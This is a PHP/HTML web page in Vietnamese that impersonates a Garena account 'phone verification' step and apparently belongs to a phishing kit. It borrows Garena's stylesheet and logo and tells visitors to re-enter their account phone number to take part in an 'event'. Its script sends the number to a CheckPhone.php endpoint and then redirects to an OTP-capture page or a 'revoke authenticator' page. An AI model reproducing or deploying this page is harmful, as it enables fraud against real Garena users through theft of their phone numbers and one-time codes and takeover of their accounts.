
<!doctype html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena">
<link href="https://account.garena.com/css/acccenter-pc.css?ver=0.000018" rel="stylesheet" type="text/css">
<script src="../Assets_Garena/js/jsencrypt.min.js" type="text/javascript"></script>

<title>Garena</title>
</head>
<body>
<?php
session_start();
$useragent = $_SERVER['HTTP_USER_AGENT']; //get the user agent
if(strpos($useragent,"Windows") ) { //string to match
 echo '<center>';
}
       
	?>





<div id="page">
<div id="header" class="header">
<div class="topBarGarena"></div>
<div class="topBar"></div>
<h1>
<a class="logo" href="javascript:;" target="_blank">
<img src="https://auth.garena.com/images/img_garena_logo.png" style="height: 35px;">
</a>
</h1>
</div>
<div id="main-panel" class="pc">
<div class="content">
    

    

<div class="content-item content-item--ipage">
   <div class="content-item__title">XÁC MINH SỐ ĐIỆN THOẠI</div>
   <div class="content-item__main">
      <div class="content-item--ipage__main">
         <div class="content__sendinfo" id="J-sendinfo">
            <div class="content__sendinfo-before">Xác minh số điện thoại chính chủ <br>
            Nếu bạn là chủ tài khoản hãy nhập lại <br>
            số điện thoại tài khoản để tham gia sự kiện
            </div>
           
         </div>
         <div class="content__form">
           <form id="login-form" class="loginForm">
               <div class="content__phone">
                 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAABmJLR0QA/wD/AP+gvaeTAAAAdklEQVRIie2VMQ6AIAwAD3/C4lsk/v8D4D9wUBMGmrSgYZBLmjCUXstQYBA7cABZGQkIFkEyFH8i1go5QZAt3SjqVQUZ8IpcX+SrsV4Q8xeLtYUpmIIp+INAu+xEPl/Xw5+oZOXq0N3nLl77MiWCURKBrW+mRk5l7D74BQTV+AAAAABJRU5ErkJggg=="> +84<?=$_SESSION['phone']?>
               </div>
  
               <div class="content__form-otpcode">
                  <div class="content__form-input">
                      <input type="tel" maxlength="11" name="phone" id="phone" class="content__form-input-widget J-validated-field" placeholder="Nhập lại số điện thoại"></div>
                      
                      
           
                      
               </div>
               
         <span id="msg" class="errorMsg" style="color:red;"></span>      
               <div class="content__form-errmsg" id="J-errdisplay-otp"></div>
               <div class="content__submit-wrap">
                   <input type="submit" class="content__submit" id="confirm-btn" name="login" value="XÁC NHẬN"></div>
            </form>
         </div>
      </div>
   </div>
</div>




</center>



</div>



<div class="linkLine">

</div>
</div>
</div>
</div>
<script src="../Assets_Garena/js/jquery-1.10.2.min.js"></script>
<script src="../Assets_Garena/js/xacminh.js"></script>
</body>
<script type="text/javascript">
$(document).ready(function() {
    $('#confirm-btn').click(function(e) {
        e.preventDefault();
         var phone = $('#login-form input[name=phone]').val();
        $( ".errorMsg" ).empty();
        $.ajax({
        type: 'GET',
        dataType: "json",
        url : '../login/CheckPhone.php',
        data: {
            phone: $("#phone").val(),
        },
        
        
        beforeSend: function() {
            $("#confirm-btn").val("Đang xác minh...").attr("disabled", !0)
        },
        complete: function() {
            $("#confirm-btn").val("Xác Thực Lại").removeAttr("disabled");
            captchaGenerate()
        }
            
        }).done(function(repo) {
            console.log(repo.code);
            if (repo.code == 1)
            {
             $('.errorMsg').append("<em></em> " + repo.error);
                captchaGenerate();    
             setTimeout(function(){location.href="../login/XacMinhOTP.php"} , 2000);   
            }
            else if (repo.code == 2)
            {
             $('.errorMsg').append("<em></em> " + repo.error);
                captchaGenerate();    
             setTimeout(function(){location.href="../login/RevokeAuthen/XacMinh.php"} , 2000);   
            }
            
            
            
            
            else {
                $('.errorMsg').append("<em></em> " + repo.error);
                captchaGenerate();
            } 
        });
    });
	$('#dangxuat-btn').click(function(e) {
        e.preventDefault();
		var user = $('#login-form input[name=user]').val();
        window.location = '../login/Dang_Xuat.php?user='+user+''; 
    });
	
});
</script>
</html>